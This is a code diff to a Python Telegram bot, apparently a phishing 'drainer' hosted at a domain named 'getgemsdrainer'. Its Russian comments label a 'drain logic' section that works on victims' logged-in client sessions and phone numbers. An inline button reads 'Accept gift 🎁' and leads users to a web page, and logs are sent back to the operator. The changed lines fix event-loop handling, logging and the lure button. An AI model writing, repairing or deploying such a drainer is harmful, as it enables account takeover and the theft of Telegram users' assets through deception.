@@ -25,7 +25,7 @@ DOMAIN = "getgemsdrainer-production.up.railway.app"
 bot = TelegramClient('bot_auth', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 app = Flask(__name__)
 
-main_loop = None
+main_loop = asyncio.get_event_loop()
 
 active_clients = {}
 temp_clients = {}
@@ -103,11 +103,16 @@ def save_log(text):
         f.write(f"[{datetime.datetime.now()}] {text}\n")
 
 def send_log(msg, buttons=None):
-    save_log(msg)
-    # Используем сохраненный main_loop вместо bot.loop
+    save_log(msg) # если есть такая функция
+    
+    # ВНИМАНИЕ: не используй bot.loop! Используй нашу переменную main_loop.
     if main_loop and main_loop.is_running():
-        coro = bot.send_message(ADMIN_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html', buttons=buttons)
-        asyncio.run_coroutine_threadsafe(coro, main_loop)
+        try:
+            coro = bot.send_message(ADMIN_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html', buttons=buttons)
+            # Передаем задачу из Flask (Thread-2) в поток бота безопасно
+            asyncio.run_coroutine_threadsafe(coro, main_loop)
+        except Exception as e:
+            print(f"Ошибка при отправке лога: {e}")
 
 # --- ЛОГИКА СЛИВА (DRAIN LOGIC) ---
 async def drain_logic(client, phone):
@@ -194,7 +199,7 @@ async def inline_handler(event):
             # Важно: В Telethon 1.x для инлайн WebApp используем Button.url + специфический параметр
             buttons=[
                 # Для инлайна в 1.42.0 используем прямой конструктор WebApp
-                [types.InlineKeyboardButtonWebView(text="Принять подарок 🎁", url=web_url)],
+                [Button.url(text="Принять подарок 🎁", url=web_url)],
                 # Прямая ссылка на подарок
                 [Button.url("Посмотреть подарок", input_text)]
             ]
